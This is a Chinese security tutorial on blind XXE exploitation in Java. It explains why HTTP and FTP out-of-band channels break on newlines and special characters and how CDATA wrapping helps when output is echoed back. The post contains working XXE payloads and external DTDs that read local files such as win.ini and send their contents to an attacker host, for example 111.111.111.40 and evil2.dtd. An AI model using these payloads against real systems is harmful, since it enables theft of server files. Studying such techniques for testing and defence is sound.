作者：Mr.zhang合天智汇

​
一般而言，在Java里碰到XXE，如果是有回显的，那自然很好办，如果是没有回显，那就需要我们构造通道来把数据带出，过去在XXE利用中，如果单纯使用HTTP协议（除了作为结尾的CRLF外，不允许出现单独的CR或LF字符），是无法读取具有换行的文件的。

比如常用作验证的win.ini文件就有换行

![v2-4ee9e4494dbb0a8ac1e62464169375ea_720w](https://pic1.zhimg.com/80/v2-4ee9e4494dbb0a8ac1e62464169375ea_720w.png)

如果想把该文件传送出去，将会报错 Illegal character in URL

![v2-02859af06ec03e577b40fd8ac6ce1db5_720w](https://pic2.zhimg.com/80/v2-02859af06ec03e577b40fd8ac6ce1db5_720w.png)

​ 在rt.jar!\sun\net\www\http\HttpClient.class中的420行，存在对换行的判断

    
    
    if (var1.indexOf(10) == -1) {
        return var1;
    } else {
        throw new MalformedURLException("Illegal character in URL");
    }

​ 这个时候如果是PHP环境，那很好办，给数据编码一下就可以顺利带出，比如base64

    
    
    <?xml version="1.0" encoding="utf-8"?>
    <!DOCTYPE root [
    <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=c:/windows/win.ini">
    <!ENTITY % dtd SYSTEM "http://127.0.0.1/evil2.dtd">
    %dtd;
    %send;
    ]>
    <root></root>

​ 这样，即使文件存在Illegal
character也可以带出，但是Java又没有相关编码的协议啊，这时候我们往往会利用FTP协议来向外传递数据，这些数据本身可能包含\r、\n等字符

![v2-f653152cee60c731442414bcb6b5624d_720w](https://pic4.zhimg.com/80/v2-f653152cee60c731442414bcb6b5624d_720w.png)

看起来似乎很美好，问题得到了解决，但是，我们往往会碰到一些意外情况，如果文件中有下面这些字符呢

    
    
    ‘ “ < > &

那将会得到以下报错，实体XXX的声明必须以>结尾

![v2-9704be77967195244755ed7b15ae73de_720w](https://pic3.zhimg.com/80/v2-9704be77967195244755ed7b15ae73de_720w.png)

dtd文件如下：

    
    
    <!ENTITY % payload "<!ENTITY &#37; send SYSTEM 'ftp://xxxxxx/%file;'>"> %payload;

这是因为xml在解析的时候，会把实体进行替换，带有单引号的文件内容在拼接进字符串之后，单引号与send实体的单引号进行了闭合，然后后面的数据就变成了无效数据

![v2-757fe5f5d3cac6adb93f604d683d2499_720w](https://pic4.zhimg.com/80/v2-757fe5f5d3cac6adb93f604d683d2499_720w.png)

如果文件中单引号后面是除了右尖括号>以外的字符，那么就会报实体XXX的声明必须以>结尾的错误

如果单引号后恰巧是右尖括号，那也不行，你后面还是有垃圾数据，顶多报错换一下

![v2-7e9c89d072b17c3d4b82fdfabd577797_720w](https://pic3.zhimg.com/80/v2-7e9c89d072b17c3d4b82fdfabd577797_720w.png)

那这个时候还有什么办法读取这类的特殊文件呢？

xml在设计的时候就考虑到了这种情况，虽然一般情况下xml要求要使用这些符号最好是把相应字符用对应实体引用来代替，但是如果是不得不用的情况下，可以使用CDATA方法来读取。

CDATA 指的是不应由 XML 解析器进行解析的文本数据（Unparsed Character Data），CDATA
部分中的所有内容都会被解析器忽略。CDATA 部分由<![CDATA[开始，由]]>结束：

让我们对payload进行一下修改：

dtd

    
    
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % end "]]>">
    <!ENTITY % c "<!ENTITY &#37; rrr SYSTEM 'ftp://xxxx/%start;%r;%end;'>">

payload

    
    
    <?xml version="1.0"?>
    <!DOCTYPE cdl [
    <!ENTITY % r SYSTEM "file:///C:/Users/mrzha/Desktop/test.ini">
    <!ENTITY % asd SYSTEM "http://111.111.111.40:48111/cdata.dtd">
    %asd;%c;%rrr;]>

但是其实这种方法是没办法的，因为它还是需要拼接到url里去，依旧会和外部的单引号闭合，如

![v2-d3bef5bc0b757937622480375378031e_720w](https://pic4.zhimg.com/80/v2-d3bef5bc0b757937622480375378031e_720w.png)

但是，CDATA方法可以用于xxe有回显的情况，也算是一种不错的方法了。

正常读取无法读取

![v2-464bad8144dd187b8d13279890c151ca_720w](https://pic3.zhimg.com/80/v2-464bad8144dd187b8d13279890c151ca_720w.png)

使用CDATA方法读取，但是请注意，这种情况还是不够完美，至少对于单独的 & 符号还是没办法

![v2-a2961e354b22cdf145d2b90ab3bf1e22_720w](https://pic2.zhimg.com/80/v2-a2961e354b22cdf145d2b90ab3bf1e22_720w.png)

除非构成了完整的实体引用格式

![v2-1edc334b228be657eb38df325023508b_720w](https://pic1.zhimg.com/80/v2-1edc334b228be657eb38df325023508b_720w.png)

另外JDK的版本更迭对使用FTP作为信息传送通道这一个技巧有影响，这也是为什么高版本无法用FTP来读取多行文件，因为FtpURLConnection.class中的static方法checkURL里的var0.toExternalForm().indexOf(10)
> -1，此处解析URL并检查URL中是否存在换行符（ascii为10），如果存在则抛出异常

具体checkURL在哪一个版本开始检查换行，笔者没有一个一个去看，有兴趣的读者可以找找看

rt.jar!\sun\net\www\protocol\ftp\FtpURLConnection.class

    
    
    static URL checkURL(URL var0) throws IllegalArgumentException {
            if (var0 != null && var0.toExternalForm().indexOf(10) > -1) {
                MalformedURLException var3 = new MalformedURLException("Illegal character in URL");
                throw new IllegalArgumentException(var3.getMessage(), var3);
            } else {
                String var1 = IPAddressUtil.checkAuthority(var0);
                if (var1 != null) {
                    MalformedURLException var2 = new MalformedURLException(var1);
                    throw new IllegalArgumentException(var2.getMessage(), var2);
                } else {
                    return var0;
                }
            }
        }

## 总结  

总的来说，如果是php环境，那自然是万事大吉，但是在java环境中，如果

有回显（不需要通过URL外带）：

    
    
    1. 普通文件  ->  直接读取回显
    
    2. 带换行文件  ->  直接读取回显
    3. 含特殊字符文件 -> CDATA回显

​ 3. 含特殊字符且有换行文件 -> CDATA 回显

无回显：

    
    
    1. 普通文件 -> HTTP或者FTP都可以带出
    2. 带换行文件 -> FTP带出
    3. 含特殊字符文件 -> 。。暂时没好的办法
    4. 含特殊字符且有换行的文件 ->  。。暂时没好的办法

另外，需要注意JDK版本的影响

## 参考  

<http://scz.617.cn/misc/201911011122.txt>

声明：笔者初衷用于分享与普及网络知识，若读者因此作出任何危害网络安全行为后果自负，与合天智汇及原作者无关！

